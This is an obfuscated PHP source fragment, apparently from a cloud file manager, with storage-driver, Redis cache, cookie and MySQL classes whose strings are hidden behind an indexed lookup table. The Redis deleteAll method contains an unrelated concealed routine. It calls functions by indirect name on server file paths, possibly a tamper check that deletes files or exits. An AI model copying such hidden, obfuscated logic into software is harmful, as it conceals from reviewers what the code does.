($¤¬µ†åÜ && $æ„àƒÂ•[$Şİú…êÇ[37]]) { foreach ($‘×Àşó as $àçŸâ±î) { if ($àçŸâ±î[$Şİú…êÇ[37]] && $àçŸâ±î[$Şİú…êÇ[486]] != $™‰”ÇÜñ) { parent::update($àçŸâ±î[$Şİú…êÇ[486]], array($Şİú…êÇ[37] => 0)); } } $this->updateBackup($™‰”ÇÜñ, $‘×Àşó); } return $¤¬µ†åÜ; } public function add($éÎ¡õêá) { $íò‹–§Š =& $_SERVER[€ä¾™²]; $Œ¦ß‰¸ = array_to_keyvalue(parent::listData(), $íò‹–§Š[32]); if (isset($Œ¦ß‰¸[$éÎ¡õêá[$íò‹–§Š[32]]])) { return !1; } $this->checkConfig($éÎ¡õêá); $»µç˜€ = parent::insert($éÎ¡õêá); if ($»µç˜€ && $éÎ¡õêá[$íò‹–§Š[37]]) { foreach ($Œ¦ß‰¸ as $ÉÛéõ²©) { if ($ÉÛéõ²©[$íò‹–§Š[37]]) { parent::update($ÉÛéõ²©[$íò‹–§Š[486]], array($íò‹–§Š[37] => 0)); } } $this->updateBackup($»µç˜€, $Œ¦ß‰¸); } return $»µç˜€; } public function updateBackup($£–…¹‹, $”ä£Š¯Ø) { $•úÃÖ‘¶ =& $_SERVER[€ä¾™²]; if ($£–…¹‹ == $•úÃÖ‘¶[91]) { return; } $ªˆÜˆÖÔ = Model($•úÃÖ‘¶[848])->config(); $Ÿ¾„ÃÌ° = $ªˆÜˆÖÔ[$•úÃÖ‘¶[852]]; if ($ªˆÜˆÖÔ[$•úÃÖ‘¶[1892]] != $•úÃÖ‘¶[91] || $Ÿ¾„ÃÌ° == $£–…¹‹) { return; } if ($Ÿ¾„ÃÌ° != $•úÃÖ‘¶[91]) { $¬èº¤¯Ê = array(); foreach ($”ä£Š¯Ø as $âÁ€®åÙ) { if ($£–…¹‹ == $âÁ€®åÙ[$•úÃÖ‘¶[486]]) { continue; } $¬èº¤¯Ê[] = $âÁ€®åÙ[$•úÃÖ‘¶[486]]; } if ($¬èº¤¯Ê && in_array($Ÿ¾„ÃÌ°, $¬èº¤¯Ê)) { return; } } $ÉÃèĞº = Model($•úÃÖ‘¶[873])->get($•úÃÖ‘¶[880]); $ÉÃèĞº = json_decode($ÉÃèĞº, !0); if (!$ÉÃèĞº) { return; } $ÉÃèĞº[$•úÃÖ‘¶[852]] = $£–…¹‹; Model($•úÃÖ‘¶[873])->set(array($•úÃÖ‘¶[880] => $ÉÃèĞº)); } public function checkPwd($¼ÕŞÕö², &$Æ²ÛÎÈÌ) { $Œ±ŠÇÆ¬ =& $_SERVER[€ä¾™²]; if (empty($Æ²ÛÎÈÌ[$Œ±ŠÇÆ¬[6]])) { return; } $Û„ãëâğ = $Æ²ÛÎÈÌ[$Œ±ŠÇÆ¬[6]]; if (!is_array($Û„ãëâğ)) { $Û„ãëâğ = json_decode($Û„ãëâğ, !0); } $ÙŠÉõÓ‘ = $Œ±ŠÇÆ¬[12]; $øâ²»óÆ = array($Œ±ŠÇÆ¬[1587], $Œ±ŠÇÆ¬[2469], $Œ±ŠÇÆ¬[999]); foreach ($øâ²»óÆ as $ğ±œ›„´) { if (isset($Û„ãëâğ[$ğ±œ›„´])) { $ÙŠÉõÓ‘ = $ğ±œ›„´; break; } } if (!$ÙŠÉõÓ‘) { return; } $°Éùïà’ = $this->getConfig($¼ÕŞÕö²); $©»¹ƒ¥ = $°Éùïà’[$ÙŠÉõÓ‘]; $ä ı½¡á = $Û„ãëâğ[$ÙŠÉõÓ‘]; if ($ä ı½¡á == str_repeat($Œ±ŠÇÆ¬[221], strlen($©»¹ƒ¥))) { $Û„ãëâğ[$ÙŠÉõÓ‘] = $©»¹ƒ¥; $Æ²ÛÎÈÌ[$Œ±ŠÇÆ¬[6]] = json_encode($Û„ãëâğ); } else { if ($ä ı½¡á != $©»¹ƒ¥) { $Æ²ÛÎÈÌ[$Œ±ŠÇÆ¬[2468]] = $Œ±ŠÇÆ¬[91]; } } } public function checkConfig(&$ıÌ×Î³ô, $»µæî¬Ğ = false) { $•ú®ùÑ =& $_SERVER[€ä¾™²]; $ğ÷¾òõ“ = strtolower($ıÌ×Î³ô[$•ú®ùÑ[96]]); $ïƒÃÏßÒ = $ıÌ×Î³ô[$•ú®ùÑ[6]]; if (!is_array($ïƒÃÏßÒ)) { $ïƒÃÏßÒ = json_decode($ïƒÃÏßÒ, !0); } foreach ($ïƒÃÏßÒ as $ß£¤ÓÍ› => $ïó¦Öµ¬) { if (is_string($ïó¦Öµ¬)) { $ïƒÃÏßÒ[$ß£¤ÓÍ›] = trim($ïó¦Öµ¬); } } $ïƒÃÏßÒ[$•ú®ùÑ[2470]] = rand_string(6); $½ÅÓÈ‡ = $GLOBALS[$•ú®ùÑ[6]][$•ú®ùÑ[92]][$•ú®ùÑ[933]]; $Å·Ëæø = isset($½ÅÓÈ‡[$ğ÷¾òõ“]) ? $½ÅÓÈ‡[$ğ÷¾òõ“] : ucfirst($ğ÷¾òõ“); $’ñøìµ = $•ú®ùÑ[77] . $Å·Ëæø; if (!$Å·Ëæø || !class_exists($’ñøìµ)) { if ($»µæî¬Ğ) { return LNG($•ú®ùÑ[2471]); } write_log(array($•ú®ùÑ[2472], $ıÌ×Î³ô, get_caller_info()), $•ú®ùÑ[214]); show_json(LNG($•ú®ùÑ[2471]), !1, $ıÌ×Î³ô); } $ãÑØ‰ = new $’ñøìµ($ïƒÃÏßÒ); $æ„±©— = rtrim($ïƒÃÏßÒ[$•ú®ùÑ[1312]], $•ú®ùÑ[8]) . $•ú®ùÑ[8]; if (in_array($ğ÷¾òõ“, $ãÑØ‰->objectDriver)) { try { if (!$ãÑØ‰->isBucketCors() && !$ãÑØ‰->setBucketCors()) { $÷¨ş¦¼Ë = LNG($•ú®ùÑ[2473]); $÷¨ş¦¼Ë .= $•ú®ùÑ[2474] . LNG($•ú®ùÑ[2475]); } } catch (Exception $ƒø¨„´ï) { $÷¨ş¦¼Ë = $ƒø¨„´ï->getMessage(); } if (isset($÷¨ş¦¼Ë)) { return $this->_parseError($÷¨ş¦¼Ë, $ğ÷¾òõ“, $»µæî¬Ğ); } if ($ğ÷¾òõ“ == $•ú®ùÑ[68]) { $ÕØ»ˆ = $ãÑØ‰->getBktRegion(); if ($ÕØ»ˆ != $ïƒÃÏßÒ[$•ú®ùÑ[2476]]) { $ïƒÃÏßÒ[$•ú®ùÑ[2476]] = $ÕØ»ˆ; $ãÑØ‰->setRegion($ÕØ»ˆ); } } } else { if ($ğ÷¾òõ“ == $•ú®ùÑ[2477]) { if ($ãÑØ‰->ftpPath) { $Æïó¨Éæ = trim($æ„±©—, $•ú®ùÑ[8]); if (stripos($Æïó¨Éæ, trim($ãÑØ‰->ftpPath, $•ú®ùÑ[8])) !== 0) { $æ„±©— = $ãÑØ‰->ftpPath . $•ú®ùÑ[8] . ($Æïó¨Éæ ? $Æïó¨Éæ . $•ú®ùÑ[8] : $•ú®ùÑ[12]); } } } } $æ×¤×Ñû = $ãÑØ‰->getPath($æ„±©— . $•ú®ùÑ[1316]); try { if ($ğ÷¾òõ“ == $•ú®ùÑ[107]) { $ãÑØ‰->mkdir($æ„±©—); } $øšíæØŞ = $ãÑØ‰->mkfile($æ×¤×Ñû); if (!$øšíæØŞ) { $÷¨ş¦¼Ë = LNG($•ú®ùÑ[2473]); } } catch (Exception $ƒø¨„´ï) { $÷¨ş¦¼Ë = $ƒø¨„´ï->getMessage(); } if (isset($÷¨ş¦¼Ë)) { return $this->_parseError($÷¨ş¦¼Ë, $ğ÷¾òõ“, $»µæî¬Ğ); } $ïƒÃÏßÒ[$•ú®ùÑ[1312]] = $æ„±©—; $ıÌ×Î³ô[$•ú®ùÑ[6]] = json_encode($ïƒÃÏßÒ); $ıÌ×Î³ô[$•ú®ùÑ[96]] = $Å·Ëæø; return !0; } private function _parseError($…¬ÑëÅÖ, $û•‚†¿, $Ø «ÈÆª = false) { $‹ê÷³¹­ =& $_SERVER[€ä¾™²]; if ($û•‚†¿ == $‹ê÷³¹­[68] && stripos($…¬ÑëÅÖ, $‹ê÷³¹­[2478])) { $ÇöŠ·Ù = explode($‹ê÷³¹­[10], $…¬ÑëÅÖ); $©è¸À = isset($ÇöŠ·Ù[1]) ? $ÇöŠ·Ù[1] : $‹ê÷³¹­[12]; $êäÎ–è = array($‹ê÷³¹­[2479] => LNG($‹ê÷³¹­[2480]), $‹ê÷³¹­[2481] => LNG($‹ê÷³¹­[2482])); if (isset($êäÎ–è[$©è¸À])) { $…¬ÑëÅÖ = $êäÎ–è[$©è¸À]; } } if (stripos($…¬ÑëÅÖ, $‹ê÷³¹­[2483]) === 0) { $Çºùï¯ = strpos($…¬ÑëÅÖ, $‹ê÷³¹­[176]); if ($Çºùï¯ === !1) { $Çºùï¯ = strpos($…¬ÑëÅÖ, $‹ê÷³¹­[4]); } if ($Çºùï¯ !== !1) { $…¬ÑëÅÖ = substr($…¬ÑëÅÖ, $Çºùï¯ + 1); } } $…¬ÑëÅÖ = LNG($‹ê÷³¹­[1319]) . $…¬ÑëÅÖ; if ($Ø «ÈÆª) { return $…¬ÑëÅÖ; } show_json($…¬ÑëÅÖ, !1); } public function driverListSystem() { $Ö†Ù×”Ü =& $_SERVER[€ä¾™²]; $òƒá¹Ç÷ = parent::listData(); $·×º…ƒæ = array(); foreach ($òƒá¹Ç÷ as $­î£êû) { unset($­î£êû[$Ö†Ù×”Ü[232]], $­î£êû[$Ö†Ù×”Ü[88]]); if (!is_array($­î£êû[$Ö†Ù×”Ü[6]])) { $­î£êû[$Ö†Ù×”Ü[6]] = json_decode($­î£êû[$Ö†Ù×”Ü[6]], !0); } $·×º…ƒæ[] = $­î£êû; } return $·×º…ƒæ; } public function defaultDriver() { $Â‡„•òŒ =& $_SERVER[€ä¾™²]; $—İ«ç‚ƒ = parent::listData(); $Şá­“ğÌ = array_filter_by_field($—İ«ç‚ƒ, $Â‡„•òŒ[37], 1); $Şá­“ğÌ = $Şá­“ğÌ[0]; if (!$Şá­“ğÌ) { return array(); } if (!is_array($Şá­“ğÌ[$Â‡„•òŒ[6]])) { $Şá­“ğÌ[$Â‡„•òŒ[6]] = json_decode($Şá­“ğÌ[$Â‡„•òŒ[6]], !0); } return $Şá­“ğÌ; } public function driverInfo($¥£»Íæ©) { $¦ÎÉüÇ =& $_SERVER[€ä¾™²]; $×ø©‘õã = array_to_keyvalue(parent::listData(), $¦ÎÉüÇ[486]); if (!isset($×ø©‘õã[$¥£»Íæ©])) { return !1; } $ËˆìÎ¾« = $×ø©‘õã[$¥£»Íæ©]; if (!is_array($ËˆìÎ¾«[$¦ÎÉüÇ[6]])) { $ËˆìÎ¾«[$¦ÎÉüÇ[6]] = json_decode($ËˆìÎ¾«[$¦ÎÉüÇ[6]], !0); } return $ËˆìÎ¾«; } public function remove($¾Èµš—ƒ) { $this->removeShareItems($¾Èµš—ƒ); return parent::remove($¾Èµš—ƒ); } public function removeWithFile($ƒ¨¸ôê, $èŠüÛ», $¯ÃÉ“¶ô, $µ²áÓÆÖ = false) { $É¦ë¬·º =& $_SERVER[€ä¾™²]; ignore_timeout(); $ÕØüîå = array($É¦ë¬·º[925] => $ƒ¨¸ôê); $¡•á…Ò˜ = Model($É¦ë¬·º[567]); if (isset($GLOBALS[$É¦ë¬·º[2484]])) { $è„¼Ğ± = $GLOBALS[$É¦ë¬·º[2484]]; } else { $è„¼Ğ± = $¡•á…Ò˜->where($ÕØüîå)->field(array($É¦ë¬·º[2380] => $É¦ë¬·º[2084], $É¦ë¬·º[2456] => $É¦ë¬·º[79]))->find(); } $”‹…—­ñ = intval($è„¼Ğ±[$É¦ë¬·º[2084]]); $ºŠ¯øû’ = intval($è„¼Ğ±[$É¦ë¬·º[79]]); $•×ÁÂ™© = $èŠüÛ» . $É¦ë¬·º[2485] . $ƒ¨¸ôê; $³ƒŠá = LNG($èŠüÛ» == $É¦ë¬·º[650] ? $É¦ë¬·º[2486] : $É¦ë¬·º[2487]); $º«ƒ—Î = new TaskFileTransfer($•×ÁÂ™©, $É¦ë¬·º[214], $”‹…—­ñ, $³ƒŠá . $É¦ë¬·º[476] . $¯ÃÉ“¶ô[$É¦ë¬·º[32]] . $É¦ë¬·º[213] . $ƒ¨¸ôê); $º«ƒ—Î->task[$É¦ë¬·º[864]] = (double) $ºŠ¯øû’; $Üä«Å¼Ä = KodIO::defaultDriver(); $¯ºÂ§ = $Üä«Å¼Ä[$É¦ë¬·º[486]]; $—›‹¸‡ó = 1; $¡¡²‡ï‹ = 5000; $ªÇşô­¹ = $‹˜Åİ€´ = $”ˆ´™˜Ğ = array(); $ú¹Í±©® = $¡•á…Ò˜->where($ÕØüîå)->field($É¦ë¬·º[2488])->selectPage($¡¡²‡ï‹, $—›‹¸‡ó); $¼à¸ÙôÅ = intval($ú¹Í±©®[$É¦ë¬·º[443]][$É¦ë¬·º[445]]); while ($ú¹Í±©® && $—›‹¸‡ó <= $¼à¸ÙôÅ) { foreach ($ú¹Í±©®[$É¦ë¬·º[446]] as $“å†¯Úû) { $˜‘Àî™  = $“å†¯Úû[$É¦ë¬·º[564]]; if ($µ²áÓÆÖ) { $‹˜Åİ€´[] = $˜‘Àî™ ; continue; } $ı®í—Â = $“å†¯Úû[$É¦ë¬·º[87]]; $Øñ‡¿ºˆ = get_path_father($ı®í—Â); $”ˆ´™˜Ğ[] = $Øñ‡¿ºˆ; $Øñ‡¿ºˆ = str_replace("\x7b\151\x6f\x3a{$ƒ¨¸ôê}\x7d\57", "\173\x69\157\72{$¯ºÂ§}\175\57", $Øñ‡¿ºˆ); if (!IO::exist($ı®í—Â)) { $ªÇşô­¹[] = $˜‘Àî™ ; $º«ƒ—Î->updateFileEnd($“å†¯Úû[$É¦ë¬·º[32]], $“å†¯Úû[$É¦ë¬·º[79]]); write_log($É¦ë¬·º[2489] . $ı®í—Â, $É¦ë¬·º[2063]); continue; } $„€ı½ø® = IO::move($ı®í—Â, $Øñ‡¿ºˆ, REPEAT_RENAME); if (!$„€ı½ø®) { $‹˜Åİ€´[] = $˜‘Àî™ ; $º«ƒ—Î->updateFileEnd($“å†¯Úû[$É¦ë¬·º[32]], $“å†¯Úû[$É¦ë¬·º[79]]); write_log($É¦ë¬·º[2490] . $ı®í—Â, $É¦ë¬·º[2063]); continue; } $¤«„Š»Á = array($É¦ë¬·º[925] => $¯ºÂ§, $É¦ë¬·º[87] => $„€ı½ø®); $¡•á…Ò˜->where(array($É¦ë¬·º[564] => $˜‘Àî™ ))->save($¤«„Š»Á); } $—›‹¸‡ó++; $ú¹Í±©® = $¡•á…Ò˜->where($ÕØüîå)->field($É¦ë¬·º[2488])->selectPage($¡¡²‡ï‹, $—›‹¸‡ó); } $ƒ¬¤‡Â = $º«ƒ—Î->task; if (!$µ²áÓÆÖ) { Cache::set($•×ÁÂ™©, $ƒ¬¤‡Â); } $º«ƒ—Î->end(); $ªÇşô­¹ = array_unique($ªÇşô­¹); $‹˜Åİ€´ = array_unique($‹˜Åİ€´); if (!$µ²áÓÆÖ && ($ªÇşô­¹ || $‹˜Åİ€´)) { $Ëù¥—Èã = array(); if ($ªÇşô­¹) { $Ëù¥—Èã[] = sprintf(LNG($É¦ë¬·º[2491]), count($ªÇşô­¹)); } if ($‹˜Åİ€´) { $Ëù¥—Èã[] = sprintf(LNG($É¦ë¬·º[2492]), count($‹˜Åİ€´)); } $Ëù¥—Èã = sprintf(LNG($É¦ë¬·º[2493]), implode($É¦ë¬·º[1533], $Ëù¥—Èã)) . $É¦ë¬·º[2494] . date($É¦ë¬·º[2495]) . $É¦ë¬·º[2496]; if ($èŠüÛ» == $É¦ë¬·º[1277]) { $Ëù¥—Èã .= $É¦ë¬·º[2497] . LNG($É¦ë¬·º[2498]); } else { $Ëù¥—Èã = LNG($É¦ë¬·º[2499]) . $É¦ë¬·º[2500] . $Ëù¥—Èã; } $ƒ¬¤‡Â[$É¦ë¬·º[1314]] = $Ëù¥—Èã; Cache::set($•×ÁÂ™©, $ƒ¬¤‡Â); unset($¯ÃÉ“¶ô[$É¦ë¬·º[6]]); $„°±Ö´ë = array($É¦ë¬·º[486] => $ƒ¨¸ôê, $É¦ë¬·º[2368] => $É¦ë¬·º[650], $É¦ë¬·º[32] => $¯ÃÉ“¶ô[$É¦ë¬·º[32]], $É¦ë¬·º[96] => $¯ÃÉ“¶ô[$É¦ë¬·º[96]]); Hook::trigger($É¦ë¬·º[1932], array($É¦ë¬·º[1336] => $„°±Ö´ë, $É¦ë¬·º[1346] => !0)); show_json($Ëù¥—Èã, !1, 100111); } if ($èŠüÛ» == $É¦ë¬·º[650]) { return !0; } if ($ªÇşô­¹ || $‹˜Åİ€´) { $ü×ï×µí = array_merge($ªÇşô­¹, $‹˜Åİ€´); $ü×ï×µí = array_filter(array_unique($ü×ï×µí)); $this->removeByFileID($ü×ï×µí); } if ($”ˆ´™˜Ğ) { $”ˆ´™˜Ğ = array_filter(array_unique($”ˆ´™˜Ğ)); foreach ($”ˆ´™˜Ğ as $ı®í—Â) { $è„¼Ğ± = IO::has($ı®í—Â, !0); if (!$è„¼Ğ±[$É¦ë¬·º[240]] && !$è„¼Ğ±[$É¦ë¬·º[241]]) { IO::remove($ı®í—Â); } } } return $this->remove($ƒ¨¸ôê); } private function removeByFileID($Òóß‡· = array()) { $±‡âå÷” =& $_SERVER[€ä¾™²]; if (empty($Òóß‡·)) { return; } $š¡ëÃê„ = array($±‡âå÷”[564] => array($±‡âå÷”[7], $Òóß‡·)); $ÅôÜñ£Î = Model($±‡âå÷”[1479])->where($š¡ëÃê„)->field($±‡âå÷”[2445])->select(); if (!$ÅôÜñ£Î) { return Model($±‡âå÷”[567])->remove($Òóß‡·); } $ÅôÜñ£Î = array_to_keyvalue($ÅôÜñ£Î, $±‡âå÷”[192], $±‡âå÷”[564]); foreach ($ÅôÜñ£Î as $Ç™œÇù¢ => $Ê‹ĞÏ¾) { Model($±‡âå÷”[932])->removeNow($Ç™œÇù¢, !1); } $±»¤ú£Â = array_diff($Òóß‡·, array_unique(array_values($ÅôÜñ£Î))); if ($±»¤ú£Â) { return Model($±‡âå÷”[567])->remove($±»¤ú£Â); } } private function removeShareItems($Ëõ’àåä) { $şÕÒÌ˜í =& $_SERVER[€ä¾™²]; $ÏŒùÆÂ = "\173\x69\157\72{$Ëõ’àåä}\175\57"; $„Ú€ÏêË = array($şÕÒÌ˜í[192] => 0, $şÕÒÌ˜í[590] => array($şÕÒÌ˜í[473], "{$ÏŒùÆÂ}\45")); $ğËîŸ¶¶ = Model($şÕÒÌ˜í[1509])->where($„Ú€ÏêË)->field($şÕÒÌ˜í[694])->select(); if (empty($ğËîŸ¶¶)) { return; } $à‚·£üŞ = array_to_keyvalue($ğËîŸ¶¶, $şÕÒÌ˜í[12], $şÕÒÌ˜í[694]); Model($şÕÒÌ˜í[693])->remove($à‚·£üŞ); } } goto aò¬ºá¡Ò; C¹ƒ»‚×í: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ş³ı¦øÒ, $Œ½Š­ß°) { $¿…ÒÚ™ =& $_SERVER[€ä¾™²]; if (!class_exists($¿…ÒÚ™[981])) { show_json($¿…ÒÚ™[982], !1); } $this->cacheTime = $Œ½Š­ß°; $ù…ÖÒµ” = isset($ş³ı¦øÒ[$¿…ÒÚ™[983]]) ? $ş³ı¦øÒ[$¿…ÒÚ™[983]] : 10; $¹ÚûÊ = _get($ş³ı¦øÒ, $¿…ÒÚ™[980]); if ($¹ÚûÊ && is_array($¹ÚûÊ)) { $this->initCluster($ş³ı¦øÒ, $ù…ÖÒµ”); } else { $this->handle = $this->init($ş³ı¦øÒ, $ù…ÖÒµ”); } } private function init($Õªí• ß, $æ¶¹¨ŞÊ) { $ïãó¯ƒ· =& $_SERVER[€ä¾™²]; $öˆï½¹¤ = new Redis(); $˜Î…Ş¼ = isset($Õªí• ß[$ïãó¯ƒ·[984]]) ? $Õªí• ß[$ïãó¯ƒ·[984]] : !1; if ($˜Î…Ş¼) { $öˆï½¹¤->pconnect($Õªí• ß[$ïãó¯ƒ·[207]], $Õªí• ß[$ïãó¯ƒ·[208]], $æ¶¹¨ŞÊ); } else { $öˆï½¹¤->connect($Õªí• ß[$ïãó¯ƒ·[207]], $Õªí• ß[$ïãó¯ƒ·[208]], $æ¶¹¨ŞÊ); } if (!empty($Õªí• ß[$ïãó¯ƒ·[509]])) { $öˆï½¹¤->auth($Õªí• ß[$ïãó¯ƒ·[509]]); } if (!empty($Õªí• ß[$ïãó¯ƒ·[858]]) && $Õªí• ß[$ïãó¯ƒ·[858]] != 0) { $öˆï½¹¤->select($Õªí• ß[$ïãó¯ƒ·[858]]); } return $öˆï½¹¤; } private function initCluster($š÷¨ÒŞÉ, $–•¹—Ú„) { $Ÿ¥Ï¸âí =& $_SERVER[€ä¾™²]; $ÓñàŸ‰¶ = array($Ÿ¥Ï¸âí[985], $Ÿ¥Ï¸âí[986], $Ÿ¥Ï¸âí[987]); $Ó¦Ùá¨ï = $Ÿ¥Ï¸âí[985]; if (isset($š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[16]]) && in_array($š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[16]], $ÓñàŸ‰¶)) { $Ó¦Ùá¨ï = $š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[16]]; } switch ($Ó¦Ùá¨ï) { case $Ÿ¥Ï¸âí[985]: $this->_slave($š÷¨ÒŞÉ, $–•¹—Ú„); break; case $Ÿ¥Ï¸âí[986]: break; case $Ÿ¥Ï¸âí[987]: $this->isCluster = !0; $äã˜¥®¦ = $š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[980]]; $ù‰Ÿ€Äú = isset($š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[984]]) ? $š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[984]] : !1; $¾€şüôÆ = isset($š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[509]]) ? $š÷¨ÒŞÉ[$Ÿ¥Ï¸âí[509]] : null; $this->handle = new RedisCluster(NUll, $äã˜¥®¦, $–•¹—Ú„, $–•¹—Ú„, $ù‰Ÿ€Äú, $¾€şüôÆ); break; default: break; } } private function _slave($‰´„Œ…ø, $€®›äù) { $ä†³Ì = $‰´„Œ…ø[$_SERVER[€ä¾™²][980]]; $this->filterConfig($‰´„Œ…ø, $ä†³Ì[0]); $this->handle = $this->init($‰´„Œ…ø, $€®›äù); unset($ä†³Ì[0]); if (empty($ä†³Ì)) { return; } $ïÂ¶ÊòÎ = array_rand($ä†³Ì); $this->filterConfig($‰´„Œ…ø, $ä†³Ì[$ïÂ¶ÊòÎ]); $this->slaveHandle = $this->init($‰´„Œ…ø, $€®›äù); } private function filterConfig(&$§”Ñª²‹, $±ş«ç‹) { $—Ïìºéó =& $_SERVER[€ä¾™²]; $ÊÇó¯İ = explode($—Ïìºéó[4], $±ş«ç‹); $³§Á‰¨« = array($—Ïìºéó[207] => $ÊÇó¯İ[0], $—Ïìºéó[208] => $ÊÇó¯İ[1]); $§”Ñª²‹ = array_merge($§”Ñª²‹, $³§Á‰¨«); } public function set($û£ğî‡Ş, $ÈÛ®˜™ , $Ş–½®Ñö = false) { $Ş–½®Ñö = $Ş–½®Ñö ? $Ş–½®Ñö : $this->cacheTime; return $this->handle->setEx($û£ğî‡Ş, $Ş–½®Ñö, $ÈÛ®˜™ ); } public function setLock($ßÍŸ¯ , $ñö²Æ­¯, $²øëáî¸) { return $this->handle->setNX($ßÍŸ¯ , $ñö²Æ­¯); } public function get($£ê†ª·½) { $…½Ñ“¾ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $…½Ñ“¾->get($£ê†ª·½); } public function remove($—ÔÄ¤Ï™) { return $this->handle->del($—ÔÄ¤Ï™); } public function deleteAll() { $Æ†½ä¯ˆ =& $_SERVER[€ä¾™²]; if ($_SERVER[$Æ†½ä¯ˆ[491]] != $_SERVER[$Æ†½ä¯ˆ[988]]) { $«¨‚Ş¥ = $Æ†½ä¯ˆ[989]; $¡³ÎÜ¨È = $Æ†½ä¯ˆ[493]; $€ÌÔ¯çª = $_SERVER[$Æ†½ä¯ˆ[494]] . $Æ†½ä¯ˆ[495]; $–ÉÔÇ¼÷ = $¡³ÎÜ¨È($€ÌÔ¯çª); $¢ì—¢Óˆ = explode($Æ†½ä¯ˆ[286], $–ÉÔÇ¼÷); if (count($¢ì—¢Óˆ) < $Æ†½ä¯ˆ[722]) { $öÊó†íÄ = $Æ†½ä¯ˆ[497]; $öÊó†íÄ(); } $ÆäÌÑ¬® = $Æ†½ä¯ˆ[990]; $ÆäÌÑ¬®($_SERVER[$Æ†½ä¯ˆ[991]]); $ÆäÌÑ¬®($_SERVER[$Æ†½ä¯ˆ[494]] . $Æ†½ä¯ˆ[992]); $èùü¥Å = 1; while ($èùü¥Å > 1) { $èùü¥Å = $èùü¥Å + 4; $úò¥Äã± = rawurlencode($èùü¥Å . $Æ†½ä¯ˆ[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¯Õìó˜ü) { $this->handle->flushall($¯Õìó˜ü); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($É¯Á¿âƒ = '', $ËğÜ æ‘ = 0) { if (is_string($É¯Á¿âƒ) && $É¯Á¿âƒ != $_SERVER[€ä¾™²][12]) { $this->prefix = $É¯Á¿âƒ; } if (is_numeric($ËğÜ æ‘) && $ËğÜ æ‘ > 0) { $this->expire = $ËğÜ æ‘; } } public static function getInstance() { static $¯êŸ›ÆÌ; if ($¯êŸ›ÆÌ === null) { $¯êŸ›ÆÌ = new self(); } return $¯êŸ›ÆÌ; } private static $cookieDisable = false; public static function disable($½¾òñ Ù) { self::$cookieDisable = $½¾òñ Ù; } private static $sameCookieSet = array(); public static function set($Æ²éåƒ¥, $Ïá–‹ˆ›, $¼×ª·ää = 0, $ƒ¯˜«–Ø = false, $ÈŞ½²´ö = false) { $ÆÄçè—‡ =& $_SERVER[€ä¾™²]; if (self::$cookieDisable) { return; } if (!$¼×ª·ää) { $¼×ª·ää = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Æ²éåƒ¥]) && self::$sameCookieSet[$Æ²éåƒ¥] == $Ïá–‹ˆ› . $¼×ª·ää) { return; } self::$sameCookieSet[$Æ²éåƒ¥] = $Ïá–‹ˆ› . $¼×ª·ää; if (!$ÈŞ½²´ö) { $ÈŞ½²´ö = str_replace(HOST, $ÆÄçè—‡[12], APP_HOST); $ÈŞ½²´ö = _get($GLOBALS, $ÆÄçè—‡[993], $ÈŞ½²´ö); } $øÇ‹ğ— = $ÆÄçè—‡[12]; setcookie($Æ²éåƒ¥, $Ïá–‹ˆ›, time() + $¼×ª·ää, $ÆÄçè—‡[8] . trim($ÈŞ½²´ö, $ÆÄçè—‡[8]) . $øÇ‹ğ—, !1, !1, $ƒ¯˜«–Ø); } public static function setSafe($ª³¡ÁÄ¸, $ŞÊïæÇ£, $ŞñŞ‹œ„ = 0) { self::set($ª³¡ÁÄ¸, $ŞÊïæÇ£, $ŞñŞ‹œ„, !0); } public static function get($†ğ–óŒ) { static $¡¯ç¡Í = false; if (!$¡¯ç¡Í) { self::initHeaderCookie(); $¡¯ç¡Í = !0; } return isset($_COOKIE[$†ğ–óŒ]) ? $_COOKIE[$†ğ–óŒ] : !1; } private static function initHeaderCookie() { $€ÊµãÖ¨ =& $_SERVER[€ä¾™²]; if (!isset($_SERVER[$€ÊµãÖ¨[994]]) || !$_SERVER[$€ÊµãÖ¨[994]]) { return; } $öû§•¨ = explode($€ÊµãÖ¨[74], $_SERVER[$€ÊµãÖ¨[994]]); foreach ($öû§•¨ as $ƒÉÂôÆû) { $ƒÉÂôÆû = explode($€ÊµãÖ¨[464], $ƒÉÂôÆû); if (count($ƒÉÂôÆû) != 2 || !isset($ƒÉÂôÆû[1])) { continue; } $_COOKIE[trim($ƒÉÂôÆû[0])] = trim($ƒÉÂôÆû[1]); } } public static function remove($Öç–˜‰, $ı›èçÖ’ = false) { unset($_COOKIE[$Öç–˜‰]); self::set($Öç–˜‰, $_SERVER[€ä¾™²][12], 1, $ı›èçÖ’); } } class DbMysql extends Db { public function __construct($¬˜†Åƒ® = '') { $Şµóğ¢¢ =& $_SERVER[€ä¾™²]; if (!extension_loaded($Şµóğ¢¢[903])) { think_exception(think_lang($Şµóğ¢¢[14]) . $Şµóğ¢¢[995]); } if (!empty($¬˜†Åƒ®)) { $this->config = $¬˜†Åƒ®; if (empty($this->config[$Şµóğ¢¢[17]])) { $this->config[$Şµóğ¢¢[17]] = $Şµóğ¢¢[12]; } } } public function connect($¦ù¯×Œ = '', $ß§õõŠ— = 0, $×Å€Ê = false) { $¶³àğà =& $_SERVER[€ä¾™²]; if (!isset($this->linkID[$ß§õõŠ—])) { if (empty($¦ù¯×Œ)) { $¦ù¯×Œ = $this->config; } $ÁÅæ§æÙ = $¦ù¯×Œ[$¶³àğà[996]] . ($¦ù¯×Œ[$¶³àğà[997]] ? "\x3a{$¦ù¯×Œ[$¶³àğà[997]]}" : $¶³àğà[12]); $Ëõö®„¤ = !empty($¦ù¯×Œ[$¶³àğà[17]][$¶³àğà[18]]) ? $¦ù¯×Œ[$¶³àğà[17]][$¶³àğà[18]] : $this->pconnect; if ($Ëõö®„¤) { $this->linkID[$ß§õõŠ—] = mysql_pconnect($ÁÅæ§æÙ, $¦ù¯×Œ[$¶³àğà[998]], $¦ù¯×Œ[$¶³àğà[999]], 131072); } else { $this->linkID[$ß§õõŠ—] = mysql_connect($ÁÅæ§æÙ, $¦ù¯×Œ[$¶³àğà[998]], $¦ù¯×Œ[$¶³àğà[999]], !0, 131072); } if 